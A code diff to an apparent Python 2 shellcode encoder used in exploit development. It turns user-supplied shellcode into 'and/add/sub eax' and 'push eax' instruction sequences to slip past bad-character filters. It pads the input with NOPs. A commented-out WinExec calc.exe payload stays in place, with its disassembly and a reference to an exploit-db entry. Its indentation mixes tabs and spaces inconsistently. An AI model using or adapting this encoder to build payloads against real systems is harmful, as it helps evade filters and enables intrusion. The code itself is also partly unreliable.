@@ -24,6 +24,13 @@
 import sys
 import time
 
+# colors
+W = '\033[0m'  # white
+R = '\033[31m' # red
+G = '\033[32m' # green
+O = '\033[33m' # orange
+
+
 # This is an alternative encoder function if [01] and/or [f] and/or [00] found
 def AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd):
 	for i in list(item):
@@ -91,12 +98,12 @@ def AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd):
 			FirstAdd   += "7"
     			SecondAdd  += "6"
 			ThirdAdd   += "5"
-	print 'and eax, 0x10101010'
-	print 'and eax, 0x01010101'
-	print 'add eax, 0x' + FirstAdd
-	print 'add eax, 0x' + SecondAdd
-	print 'add eax, 0x' + ThirdAdd
-	print 'sub eax, 0x33333333'
+	print 'and  eax, 0x554e4d4a'
+	print 'and  eax, 0x2a313235'
+	print 'add  eax, 0x' + FirstAdd
+	print 'add  eax, 0x' + SecondAdd
+	print 'add  eax, 0x' + ThirdAdd
+	print 'sub  eax, 0x33333333'
 	print 'push eax'
 
 # This is default encoder function if none of 8 bytes chuncks have [f] or [01] or [00]
@@ -147,14 +154,14 @@ def DefaultEncoder(item, FirstAdd, SecondAdd):
 		elif i == 'e':
                        	FirstAdd   += "7"
 			SecondAdd  += "7"
-	print 'and eax, 0x10101010'
-	print 'and eax, 0x01010101'
-	print 'add eax, 0x' + FirstAdd
-	print 'add eax, 0x' + SecondAdd
+	print 'and  eax, 0x554e4d4a'
+	print 'and  eax, 0x2a313235'
+	print 'add  eax, 0x' + FirstAdd
+	print 'add  eax, 0x' + SecondAdd
 	print 'push eax'
 
 def main():
-
+	
 	# change shellcode here I used the following as an example, see the link https://www.exploit-db.com/exploits/44455/
 	# 0:  33 c0                   xor    eax,eax           # zero out eax register
 	# 2:  50                      push   eax               # push eax (null-byte) to terminate "calc.exe"
@@ -166,22 +173,49 @@ def main():
 	# 12: bb 5d 2b 86 7c          mov    ebx,0x7c862b5d    # move the pointer to WinExec() [located at 0x7c862b5d in kernel32.dll (via arwin.exe) on WinXP SP3] into ebx
 	# 17: ff d3                   call   ebx               # call WinExec()
 
-	Shellcode = ("\x33\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6C\x63\x8b\xc4\x6a\x01\x50\xbb\x5d\x2b\x86\x7c\xff\xd3\x90\x90\x90") 
-	Shellcode = Shellcode[::-1]
+	#Shellcode = ("\x33\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6C\x63\x8b\xc4\x6a\x01\x50\xbb\x5d\x2b\x86\x7c\xff\xd3\x90\x90\x90")
 
-	ShellcodeFormatted = ''
-	for x in bytearray(Shellcode):
-		ShellcodeFormatted += '%02x' %x
+	# take shellcode as raw input
+	Shellcode = raw_input("Enter your shellcode: ")
+	Shellcode = Shellcode.replace("\\x","")
+	Shellcode = Shellcode.replace("'","")
+	Shellcode = Shellcode.replace('"',"")
+
+	#Check the size of user provided shellcode and pad with NOPS if need be
+	ShellcodeSize = ''
+	ShellcodeSize = [Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]
+	if len(ShellcodeSize) % 4 != 0:
+        	print "["+R+"!"+W+"] Shellcode size is not divisible by 4"
+		time.sleep(1)
+        	NOP = '90'
 	
-	ShellcodeFormatted = [ShellcodeFormatted[i:i+8] for i in range(0, len(ShellcodeFormatted), 8)]
+		if ((len(ShellcodeSize))+1) % 4 == 0:
+			Shellcode += "90"
+			print "["+G+"+"+W+"] Padding shellcode with 1 NOPS.."
+			time.sleep(1)		
+		elif ((len(ShellcodeSize))+2) % 4 == 0:
+			Shellcode += "90"
+			Shellcode += "90"
+			print "["+G+"+"+W+"] Padding shellcode with 2 NOPS.."
+			time.sleep(1)
+		else:
+			Shellcode += "90"
+			Shellcode += "90"
+			Shellcode += "90"
+			print "["+G+"+"+W+"] Padding shellcode with 3 NOPS.."
+			time.sleep(1)
+	else:
+		print "["+G+"+"+W+"] Shellcode size is divisible by 4"
+		time.sleep(1)
+		pass
+
+	Shellcode = "".join(reversed([Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]))
+
+	ShellcodeFormatted = ''	
+	ShellcodeFormatted = [Shellcode[i:i+8] for i in range(0, len(Shellcode), 8)]
 	FirstAdd    = ""
 	SecondAdd   = ""
 	ThirdAdd    = ""
-
-	W = '\033[0m'  # white
-	R = '\033[31m' # red
-	G = '\033[32m' # green
-	O = '\033[33m' # orange
 
 	for item in ShellcodeFormatted:
 		print '[' +G+ '+' +W+ '] Encoding [%s]..' %item
@@ -204,7 +238,7 @@ def main():
 			AltEncoder(item, FirstAdd, SecondAdd, ThirdAdd)
 		# if this is true go to DefaultEncoder
 		else:
-                        print '['+R+'!'+W+'] ['+O+'01'+W+'] and ['+O+'f'+W+'] and ['+O+'00'+W+'] not found, using default encoder..'
+                        print '['+G+'+'+W+'] ['+O+'01'+W+'] and ['+O+'f'+W+'] and ['+O+'00'+W+'] not found, using default encoder..'
 			time.sleep(1)
 			DefaultEncoder(item, FirstAdd, SecondAdd)
 
